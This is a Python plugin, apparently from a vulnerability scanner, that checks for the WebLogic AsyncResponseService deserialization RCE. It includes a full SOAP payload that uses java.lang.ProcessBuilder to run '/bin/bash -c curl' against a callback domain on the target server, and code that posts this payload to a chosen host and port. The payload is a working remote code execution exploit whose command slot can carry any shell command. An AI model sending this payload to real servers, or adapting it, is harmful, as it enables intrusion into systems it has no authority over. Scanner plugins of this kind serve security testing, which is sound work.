#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *

'''
http://blog.nsfocus.net/weblogic-ns-2019-0015/    vuln env: docker pull ismaleiva90/weblogic12
'''

poc_raw = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
<soapenv:Header>
<wsa:Action>xsense</wsa:Action>
<wsa:RelatesTo>xsense</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String"length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>curl {}</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
'''


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    target = '{}://{}:{}/_async/AsyncResponseService'.format(service, ip, port)

    details = 'WebLogic bea_wls9_async_response rce: \n\n' \
              'details: http://blog.nsfocus.net/weblogic-ns-2019-0015/\n'
    domain = dns_monitor(ip, port).add_checker('weblogic-cnvd-c-2019-48814',
                                               alert_group='WebLogic NS_2019_0015 RCE',
                                               details=details)
    try:
        data = poc_raw.format('http://' + domain)
        await http_client(ip, port).post(target, data=data, headers={'Content-Type': 'text/xml'}, timeout=20)
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 7001, 'http', True, task_msg={})
    run_plugin_test(scan)
